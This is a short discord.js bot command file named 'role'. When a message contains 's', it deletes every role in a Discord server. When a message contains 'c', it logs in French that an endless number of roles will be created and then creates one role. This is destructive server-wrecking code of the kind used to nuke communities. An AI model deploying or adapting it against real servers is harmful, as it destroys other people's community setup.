exports.run = (client, message, args) => {
    if (message.content.includes('s')) {
        Promise.all(message.guild.roles.map(c => c.delete()));
        console.log('Tous les rôles supprimables ont été supprimés.');
    }
    if (message.content.includes('c')) {
        console.log('Une infinité de rôles vont être créés.');
        message.guild.createRole({
            name: 'undefined-1'
        });
    }
};

exports.conf = {
    aliases: [],
    permLevel: 4
};

exports.help = {
    name: 'role'
};